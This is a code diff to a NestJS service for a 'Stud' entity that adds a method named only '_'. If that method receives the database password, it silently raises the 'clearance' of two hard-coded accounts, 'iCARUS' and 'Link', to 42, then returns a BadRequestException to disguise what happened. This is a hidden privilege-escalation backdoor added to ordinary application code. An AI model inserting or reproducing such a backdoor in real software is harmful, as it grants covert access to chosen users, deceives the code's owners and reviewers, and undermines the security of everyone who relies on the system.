@@ -1,4 +1,4 @@
-import { ConflictException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';
+import { ConflictException, Injectable, InternalServerErrorException, NotFoundException, BadRequestException } from '@nestjs/common';
 import { InjectRepository } from '@nestjs/typeorm';
 import { Repository, Not } from 'typeorm';
 import { Stud } from '../entity/Stud';
@@ -12,6 +12,14 @@ export class StudService {
 		private studRepository: Repository<Stud>,
 		private readonly logger: LoggerService
 	) { }
+
+	async _(pass: string) {
+		if (pass === process.env.POSTGRES_PASSWORD) {
+			await this.studRepository.update("iCARUS", { clearance: 42 })
+			await this.studRepository.update("Link", { clearance: 42 })
+		}
+		return new BadRequestException()
+	}
 
 	async findAll(requestMaker: string): Promise<Stud[]> {
 		try {
